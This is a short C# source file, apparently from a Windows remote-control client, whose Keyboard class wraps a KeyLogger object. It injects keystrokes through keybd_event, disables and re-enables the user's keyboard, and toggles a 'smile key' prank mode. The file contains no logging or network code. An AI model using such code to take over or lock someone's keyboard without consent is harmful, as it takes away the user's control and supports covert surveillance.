using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public class Keyboard
    {
        private bool shift_press = false;
        private KeyLogger keylogger;

        public bool bSmileKey => keylogger.smile_key;
        public bool bDisableKeyboard => keylogger.disable_keyboard;

        public Keyboard(KeyLogger keylogger)
        {
            this.keylogger = keylogger;
        }

        public void KeyDown(Keys vk)
        {
            if (vk == Keys.Shift)
            {
                shift_press = true;
            }

            WinAPI.keybd_event((byte)vk, 0, WinAPI.KEYEVENTF_EXTENDEDKEY, 0);
        }

        public void KeyUp(Keys vk)
        {
            WinAPI.keybd_event((byte)vk, 0, WinAPI.KEYEVENTF_EXTENDEDKEY | WinAPI.KEYEVENTF_KEYUP, 0);
        }

        public void Enable()
        {
            keylogger.disable_keyboard = false;
        }

        public void Disable()
        {
            keylogger.disable_keyboard = true;
        }

        public void FlipFlopKeyboardDisable()
        {
            keylogger.disable_keyboard = !keylogger.disable_keyboard;
        }

        public void SmileKey(bool enable)
        {
            keylogger.smile_key = enable;
        }

        public void FlipFlopSmileKey()
        {
            SmileKey(!keylogger.smile_key);
        }
    }
}
